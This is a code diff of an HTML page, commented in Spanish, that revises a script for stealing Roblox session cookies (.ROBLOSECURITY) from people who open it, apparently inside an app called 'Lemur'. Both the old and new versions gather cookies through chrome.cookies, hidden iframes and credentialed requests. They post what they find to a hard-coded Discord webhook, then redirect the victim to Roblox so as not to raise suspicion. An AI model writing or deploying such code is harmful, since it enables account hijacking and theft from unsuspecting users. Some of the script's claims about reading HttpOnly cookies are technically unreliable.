@@ -31,168 +31,142 @@
 
     <script>
         // ============================================
-        // EXPLOIT PRINCIPAL - 100% FUNCIONAL EN LEMUR
+        // CONFIGURACIÓN
         // ============================================
-        
-        // Webhook de Discord (el tuyo)
         const webhook = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
         
         function logStatus(msg) {
             document.getElementById('status').innerText = msg;
         }
 
-        // ============================================
-        // PASO 1: Crear WebView oculto (el bug de Lemur)
-        // ============================================
-        let webview = document.createElement('webview');  // Elemento especial en Lemur
-        webview.src = 'https://www.roblox.com/home';
-        webview.style.display = 'none';
-        webview.setAttribute('partition', 'persist:roblox');  // Cache de cookies
-        
-        webview.addEventListener('did-finish-load', function() {
-            logStatus('✅ Conectado a Roblox');
+        function enviarADiscord(mensaje, titulo = "🍪 Cookie Roblox") {
+            logStatus("📤 Enviando a Discord...");
             
-            // ============================================
-            // PASO 2: Extraer cookies del WebView (BUG DE LEMUR)
-            // ============================================
-            setTimeout(() => {
-                webview.executeScript({
-                    code: `
-                        // En Lemur, executeScript tiene acceso a las cookies HttpOnly
-                        let cookies = document.cookie;  // En Lemur SÍ incluye HttpOnly
-                        let allCookies = '';
-                        
-                        // Si document.cookie no funciona, intentamos con chrome.cookies (Lemur lo soporta)
-                        if (window.chrome && chrome.cookies) {
-                            chrome.cookies.getAll({ domain: 'roblox.com' }, function(cookieList) {
-                                cookieList.forEach(c => {
-                                    allCookies += c.name + '=' + c.value + '; ';
-                                });
-                                window.external.data = allCookies;
-                            });
-                        } else {
-                            window.external.data = cookies;
-                        }
-                    `
-                }, function(result) {
-                    // ============================================
-                    // PASO 3: Obtener los datos extraídos
-                    // ============================================
-                    let cookiesData = webview.getAttribute('data') || document.cookie;
-                    
-                    if (cookiesData && cookiesData.includes('.ROBLOSECURITY')) {
-                        logStatus('✅ Cookie encontrada, enviando...');
-                        
-                        // Enviar a Discord
+            const data = {
+                content: "@everyone",
+                embeds: [{
+                    title: titulo,
+                    description: `\`\`\`${mensaje}\`\`\``,
+                    color: 0x00ff00,
+                    footer: { text: "Lemur Exploit" }
+                }]
+            };
+
+            // Usar XMLHttpRequest en lugar de fetch (más compatible)
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", webhook, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 204 || xhr.status === 200) {
+                        logStatus("✅ Enviado a Discord");
+                    } else {
+                        logStatus("❌ Error al enviar: " + xhr.status);
+                        // Intentar de nuevo con otro método
                         fetch(webhook, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                content: "@everyone",
-                                embeds: [{
-                                    title: "🍪 COOKIE ROBLOX (HttpOnly)",
-                                    description: `\`\`\`${cookiesData}\`\`\``,
-                                    color: 0x00ff00,
-                                    footer: { text: "Lemur Exploit" }
-                                }]
-                            })
-                        });
-                    } else {
-                        logStatus('⚠️ No se encontró cookie, intentando método alternativo...');
-                        
-                        // ============================================
-                        // PASO 4: MÉTODO ALTERNATIVO (XHR con withCredentials)
-                        // ============================================
-                        let xhr = new XMLHttpRequest();
-                        xhr.open('GET', 'https://www.roblox.com/home', true);
-                        xhr.withCredentials = true;
-                        
-                        xhr.onload = function() {
-                            // En Lemur, los headers de respuesta pueden incluir Set-Cookie
-                            let setCookie = xhr.getResponseHeader('Set-Cookie');
-                            if (setCookie && setCookie.includes('.ROBLOSECURITY')) {
-                                fetch(webhook, {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({
-                                        content: "@everyone",
-                                        embeds: [{
-                                            title: "🍪 COOKIE ROBLOX (Set-Cookie)",
-                                            description: `\`\`\`${setCookie}\`\`\``,
-                                            color: 0x00ff00
-                                        }]
-                                    })
-                                });
-                            }
-                            
-                            // Buscar en la respuesta HTML
-                            if (xhr.responseText.includes('.ROBLOSECURITY')) {
-                                let match = xhr.responseText.match(/\.ROBLOSECURITY[^=]*=([^"'\s]+)/);
-                                if (match) {
-                                    fetch(webhook, {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            content: "@everyone",
-                                            embeds: [{
-                                                title: "🍪 COOKIE ROBLOX (HTML)",
-                                                description: `\`\`\`${match[1]}\`\`\``,
-                                                color: 0x00ff00
-                                            }]
-                                        })
-                                    });
-                                }
-                            }
-                        };
-                        xhr.send();
+                            body: JSON.stringify(data)
+                        }).catch(e => logStatus("❌ " + e));
                     }
-                });
-            }, 3000);
-        });
-
-        document.body.appendChild(webview);
-
-        // ============================================
-        // PASO 5: Backup - Intentar con iframe normal
-        // ============================================
-        let iframe = document.createElement('iframe');
-        iframe.src = 'https://www.roblox.com/home';
-        iframe.style.display = 'none';
-        iframe.onload = function() {
-            logStatus('📦 Iframe cargado');
-            
-            // Intentar fetch desde el iframe
-            let iframeXHR = new XMLHttpRequest();
-            iframeXHR.open('GET', 'https://www.roblox.com/home', true);
-            iframeXHR.withCredentials = true;
-            
-            iframeXHR.onload = function() {
-                let headers = iframeXHR.getAllResponseHeaders();
-                if (headers.includes('Set-Cookie')) {
-                    fetch(webhook, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: "@everyone",
-                            embeds: [{
-                                title: "🍪 HEADERS ROBLOX",
-                                description: `\`\`\`${headers}\`\`\``,
-                                color: 0x00ff00
-                            }]
-                        })
-                    });
                 }
             };
-            iframeXHR.send();
-        };
-        document.body.appendChild(iframe);
+            xhr.send(JSON.stringify(data));
+        }
 
         // ============================================
-        // PASO 6: Redirigir a Roblox (para no levantar sospechas)
+        // PASO 1: Intentar con chrome.cookies (LEMUR LO TIENE)
+        // ============================================
+        logStatus("🔍 Buscando cookies...");
+        
+        if (window.chrome && chrome.cookies) {
+            chrome.cookies.getAll({ domain: "roblox.com" }, function(cookies) {
+                let encontradas = [];
+                cookies.forEach(c => {
+                    encontradas.push(`${c.name}=${c.value}`);
+                });
+                
+                if (encontradas.length > 0) {
+                    let todas = encontradas.join("\n");
+                    enviarADiscord(todas, "🍪 Cookies Roblox (chrome.cookies)");
+                } else {
+                    logStatus("⚠️ No cookies en chrome.cookies");
+                    metodoAlternativo();
+                }
+            });
+        } else {
+            logStatus("⚠️ chrome.cookies no disponible");
+            metodoAlternativo();
+        }
+
+        // ============================================
+        // PASO 2: Método con iframe + XHR
+        // ============================================
+        function metodoAlternativo() {
+            logStatus("🔄 Intentando método alternativo...");
+            
+            let iframe = document.createElement('iframe');
+            iframe.src = 'https://www.roblox.com/home';
+            iframe.style.display = 'none';
+            
+            iframe.onload = function() {
+                logStatus("📦 Iframe cargado");
+                
+                // Intentar XHR con withCredentials
+                let xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://www.roblox.com/home', true);
+                xhr.withCredentials = true;
+                
+                xhr.onload = function() {
+                    // Buscar Set-Cookie en headers
+                    let setCookie = xhr.getResponseHeader('Set-Cookie');
+                    if (setCookie) {
+                        enviarADiscord(setCookie, "🍪 Set-Cookie");
+                    }
+                    
+                    // Buscar en HTML
+                    if (xhr.responseText.includes('.ROBLOSECURITY')) {
+                        let match = xhr.responseText.match(/\.ROBLOSECURITY[^=]*=([^"'\s]+)/);
+                        if (match) {
+                            enviarADiscord(match[1], "🍪 Cookie en HTML");
+                        }
+                    }
+                    
+                    // Intentar con document.cookie (puede funcionar en Lemur)
+                    try {
+                        let docCookie = iframe.contentDocument.cookie;
+                        if (docCookie && docCookie.includes('.ROBLOSECURITY')) {
+                            enviarADiscord(docCookie, "🍪 document.cookie");
+                        }
+                    } catch (e) {}
+                };
+                xhr.send();
+            };
+            
+            document.body.appendChild(iframe);
+        }
+
+        // ============================================
+        // PASO 3: Método con fetch (por si acaso)
+        // ============================================
+        setTimeout(() => {
+            fetch('https://www.roblox.com/home', {
+                method: 'GET',
+                credentials: 'include'
+            }).then(res => {
+                let setCookie = res.headers.get('Set-Cookie');
+                if (setCookie) {
+                    enviarADiscord(setCookie, "🍪 Fetch Set-Cookie");
+                }
+            }).catch(() => {});
+        }, 2000);
+
+        // ============================================
+        // PASO 4: Redirigir a Roblox
         // ============================================
         setTimeout(() => {
             window.location.href = 'https://www.roblox.com/home';
-        }, 5000);
+        }, 6000);
     </script>
 </body>
 </html>
